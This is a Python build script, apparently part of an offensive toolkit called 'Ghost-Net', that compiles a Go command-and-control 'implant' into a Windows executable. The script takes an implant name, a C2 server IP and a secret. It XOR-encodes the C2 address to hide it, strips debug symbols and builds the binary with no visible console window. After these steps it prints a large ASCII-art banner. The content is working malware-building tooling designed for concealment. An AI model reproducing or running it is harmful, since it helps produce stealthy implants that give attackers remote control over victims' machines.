import os
import subprocess
import sys


#e7bcc0ba5fb1dc9cc09460baaa2a6986

def encrypt_string(s: str, key: int = 0x45) -> str:
    encoded = ''.join(chr(ord(char) ^ key) for char in s)
    return encoded

def build_implant(implant_name, ip_c2, secret):
    # Change the working directory to /BFimplant
    try:
        os.chdir('./BFimplant')
    except FileNotFoundError:
        print('Error: The directory /BFimplant does not exist.')
        sys.exit(1)

    # Build the Go implant
    build_cmd = [
        'go', 'build',
        '--ldflags=-s -w -X main.secret='+secret+' -X main.ipC2='+encrypt_string(ip_c2)+' -H windowsgui',
        '-o', f'{implant_name}.exe',
        './cmd/'
    ]

    try:
        subprocess.run(build_cmd, check=True)
        print(f'Implant {implant_name}.exe built successfully!')
    except subprocess.CalledProcessError as e:
        print(f'Failed to build the implant: {e}')
        sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('Usage: create_implant.py <implant_name> <ip-C2> <secret>')
        sys.exit(1)

    print('''
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%##**+==+++*##%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%##+-:...::::....:-=*#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#*-..:-==++****++==-..:+#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#*-..-==+**#%%%%%%%%%#*+: :+#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#+..-=+**#%%@@@@@@@@@@@%%#+: -*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#+..-+**#%%%%%%%%%@@@@@%%%%%#- :*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#*..-+**#%%%%#+-=*%%@@%%#+--+##= -*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#= :+**#%%%%#-   .*%%%%%*    +#*: +#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@%%%*:.=***%%%%%#+.  -#%%%%%#=..-#%%= -*###%%%@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@%%%%#*..=**#%%%%%%%####%%%%%%%%##%%%%*..:..:-*#%%@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@%%%%%##+.:=#*%%%%%%%%%%%%%%%%%%%%%%%%%%*:  -=-..+#%%@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@%%%%#+=---=.:=#*#%%%%%%%%%%%%%%%%%%%%%%%%%*+=+*#+=..*#%@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@%%#+..:::.  -+**%%#%%%%%%%%%%%%%%%%%%%%#%%##+#*#*+: +#%%@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@%%#= :-=**++-*+#*%%#%%%%%%%%%%%%%%%%%%%%#%%*****#*+: +#%%@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@%#*:.-+*##*#+#*#*%%#%%#%%%%%%%%%%%%%%%%%#%%++::-*+=: +#%%@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@%%#*..-*+##*#+#*#*#%#%%#%%%%#%%%%%%%%%%%%#%#=..: -=-.:*#%%@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@%%#*:.-++**+*=****#%#%%#%#%%#%%%%%#%%%%%#*+=..++:...:*#%%@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@%%#+..---....-+**##*%%#%#%%#%%#%%#%%%%#*+-..+###***#%%%@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@%%#*-:::=++=.:*+##*#%#%#%%#%%#%%#%%%#+=-..+#%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@%%%%%######*= -+##*%%#%#%%#%%#%%#%#*+-: :+#%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%#+:.=*#*#%#%##%#%%#%%#*+=-. -*#%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%#*- =***%%#%#######**+=-:.:+*#%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%#*- =*#*########**+==-:..-+*#%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@%%%%#*#%%%##*: -*#*####***+==--:..-+**###+*###*-=#%%%#%@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@#*#%%%%%%#*=*####*+..-##*##*+++==-::..-++*+=*##**####%%##*=#%%@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@%###*=#%@@%%%%%#%%%##*- -=**+++===-::..:=+***####*=*##+=+######%%###=-#@@@@@@@@@@@@@@@
        @@@@@@@@@@#++#*%%%%%%%%#=+####*- :-====--::...:-+++**##+=*###%%%%%++###==*%%@%%###+*@@@@@@@@@@@@
        @@@@@@@@##%%#=-+#%%%%%%%%##**+: :::::::....-==+***+######*#%%#####+++#%%%%%%%%#**#*##%#%@@@@@@@@
        @@@@@@@%++#%%#@@%+==+=*#####*-.......::-=++******+-=####*-:-*#%%%%%%%#%@@@%###+--*#%%*=#@@@@@@@@
        @@@@@@@@%@*:.=%%%%+##%%%%%%%##*==++****#######*###**####%%##%##%%%%%#=-+#%%%@@@@@@@%%#+*@@@@@@@@
        @@@@@@@@@@@%%%#%%*%@@@@%*==*##########+######*=*#%%#%%%%%#*=*###+-=#####%%%%%%#%#*#%%#**%@@@@@@@
        @@@@@@@@@@@@@@%-.:*%%%%%%*+##%%%%%##*+-+###%%#*%##*::*###%%%%%###*+###%%%%%%%%#*=-+@@@@@@@@@@@@@
        @@@@@@@@@@@@%%#%%%#%@@@@@#%@%*-:+#%%%%#%%%%%#=-+##%%*%%%%#-:=#%@@@#%@@%%#+=*%%@@%#@@@@@@@@@@@@@@
        @@@@@@@@@@*-=%%%%%%+:=%@*-+##%%%%%%##%*###%%%#+%%%%%#+###%%%%%%###=-=#%%%#*%%%%*-+%@@@@@@@@@@@@@
        @@@@@@@@@@%#%@@@@@@@%#%#*+*#%%%%%%%##+::*#%%%%*%%%##=::*#%%%%%%%%%*=+*@@@@@@@@@#+*@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@*:=%@@@@+::*%%%@@@%%@@%%%%#+**#%%@#%%%%%%%%@@%*%@%++%@@@@@@@%@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@#@@@@@@@#%%%%%%@@%#@@@@%#=-=#%@@@@#@@@@%%%#-..#@@#+%@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@%%#=-+###%%%%%%%####-.:#%%@@@@%#@@@@%@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*%@@@@@@@@@@@@@@%%%@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


                      ________.__                    __             _______          __   
                     /  _____/|  |__   ____  _______/  |_           \      \   _____/  |_ 
                    /   \  ___|  |  \ /  _ \/  ___/\   __\  ______  /   |   \_/ __ \   __\\
                    \    \_\  \   Y  (  <_> )___ \  |  |   /_____/ /    |    \  ___/|  |  
                     \______  /___|  /\____/____  > |__|           \____|__  /\___  >__|  
                            \/     \/           \/                         \/     \/    
                                                                          
                                               enigma - Trez13 

    ''')
    
    implant_name = sys.argv[1]
    ip_c2 = sys.argv[2]
    secret = sys.argv[3]

    build_implant(implant_name, ip_c2, secret)
